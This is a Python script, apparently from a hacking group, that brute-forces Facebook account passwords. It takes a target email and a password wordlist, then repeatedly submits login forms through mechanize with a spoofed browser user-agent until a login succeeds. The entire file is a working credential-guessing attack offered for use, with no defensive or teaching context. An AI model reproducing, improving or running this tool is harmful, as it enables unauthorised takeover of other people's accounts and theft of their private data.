#!/usr/bin/python
# -*- coding: utf-8 -*-

#Creator : Anon6372098
try:
 ##----------- Import Libraries -----------##
 import socket,time,os,optparse,mechanize  ##
 ##----------------------------------------##
except:
	print("[!] The [ mechanize library ] is Missing!\n[*] Please Install it Using this command> [ pip install mechanize ]")
	exit(1)
################## check internet #################
server = "www.google.com"                         #
def check():                                      #
   try:                                           #
      s = socket.gethostbyname(server)            #
      ss = socket.create_connection((s, 80), 2)   #
      return True                                 #
   except:                                        #
         pass                                     #
   return False                                   #
                                                  #
check = check()                                   #
###################################################

parse = optparse.OptionParser("""\nUsage: python ./anonfbbrute.py -T <Target Email> -W <Wordlist File>
OPTIONS:
        -t <target email>        ::>   Set Target Email
        -w <word list file>      ::>   Set Wordlist File 
Example:
        ./anonfbbrute.py -t target@gmail.com -w /storage/emulated/0/passwords.txt

Creator : Anon6372098
Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)
Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
""")
def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
			help="target email !")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
			help="wordlist file !")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None: 
     user = options.taremail
     passw = options.wlst
     global check
     if check == True:
	         try:
		    passwfile = open(passw, "r")
		 except:
                        print("\n[!] No Such File: "+passw+"  !!!\n")
                        exit(1)
		 os.system("cls || clear")
		 time.sleep(0.10)
		 print("\n[*] website>: www.facebook.com ")
		 time.sleep(0.10)
		 print("\n[+] Target Email>: "+str(user))
		 time.sleep(0.10)
		 print("\n[@] WordList>: "+str(passw))
		 time.sleep(0.10)
		 print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
		 time.sleep(0.20)
		 print("\n[$]--- Brute Force Attack Start ---[$]\n")
		 time.sleep(0.8)
		 lo = 1
		 for password in passwfile:
				          try:
                		             br1=mechanize.Browser()
                		             br1.set_handle_robots(False)
                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                		             op=br1.open("https://facebook.com")
		
                	                     br1.select_form(nr=0)
                		             br1.form["email"]=user
                		             br1.form["pass"]=password
                		             br1.method="POST"
                		             res = br1.submit()
					     result = res.get_data()
					     if "home_icon" in result:
                                                print("[+]~[{}] Trying Password[ {} ]  ==> Yes :)".format(lo,password.strip()))
                   			        print ("\n[*] Found! Password is ==> "+ password)
					        break
						
                		             else:
                    			          print('[-]~[{}] Testing password[ {} ] ==> No :('.format(lo,password.strip()))
                    			          lo +=1
            			          except KeyboardInterrupt:
                                                 print('\n---------------------------\n[!][CTRL+C] Exiting.....!\n')
						 exit(1)
     elif check == False:
		    print("\n[!] Please Check Your Internet Connection !!!")
		    exit(1)
   else:
	print(parse.usage)
	exit(1)

if __name__=='__main__':
	Main()
	
##############################################################
##################### 		     #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Anon6372098
#Team D4RK SYST3M F41LUR3 S33K3R (DSFS)
#Yt Channel : D4RK SYST3M F41LUR3 S33K3R 
#Contact me : anon6372098@gmail.com
#Have a nice day :)
#GoodBye
